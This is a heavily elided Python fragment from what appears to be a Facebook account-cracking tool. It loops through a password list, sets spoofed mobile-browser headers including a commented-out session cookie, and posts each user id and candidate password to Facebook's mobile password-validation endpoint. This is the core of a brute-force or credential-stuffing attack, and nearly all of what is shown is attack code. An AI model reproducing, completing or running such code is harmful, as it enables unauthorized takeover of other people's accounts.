    ...
    try:
        ...
        for pass2 in passlist:
            ...
            headers={
                    ...
                    # 'cookie': 'datr=8i7ZZjnolI-NyE9HOmgQ9rkM; sb=8i7ZZrjf28iPP-ZpDuWNpoo8; m_pixel_ratio=3; dpr=3.2983407974243164; wd=360x668; fr=0VpTAEv7iYf3I97bl..Bm2S7y..AAA.0.0.Bm2S8o.AWVxHvyrJ4Y',
                    'dpr': '3',
            ...
            data={
                    ...
                    "uid":ids,
                    "next":"https://m.alpha.facebook.com/login/save-device/",
                    "flow":"login_no_pin",
                    "pass":pas,
                }
            comp = session.post("https://m.alpha.facebook.com/login/device-based/validate-password/?shbl=0",headers=headers,data=data)
